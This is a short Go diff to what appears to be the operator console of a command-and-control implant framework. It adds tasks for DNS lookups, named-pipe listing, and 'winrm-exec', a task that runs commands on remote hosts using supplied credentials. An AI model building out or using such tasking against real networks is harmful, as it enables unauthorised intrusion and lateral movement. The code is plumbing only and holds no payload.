@@ -683,6 +683,14 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareShellcodeTask(c, clientId, command, "<LocalFile> <ModuleAddress>: ")
 	case "hook-check":
 		PrepareTaskSimple(c, clientId, command)
+	case "nslookup":
+		PrepareTaskWithOneArg(c, clientId, command, "<Domain/HostName>: ")
+	case "reverse-lookup":
+		PrepareTaskWithOneArg(c, clientId, command, "<IP>: ")
+	case "list-pipes":
+		PrepareTaskSimple(c, clientId, command)
+	case "winrm-exec":
+		PrepareTaskWithArgs(c, clientId, command, "<Domain> <Username> <Password> <Host> <Port> <Command> <SSL>: ")
 	default:
 		c.Println("Task not found.")
 	}
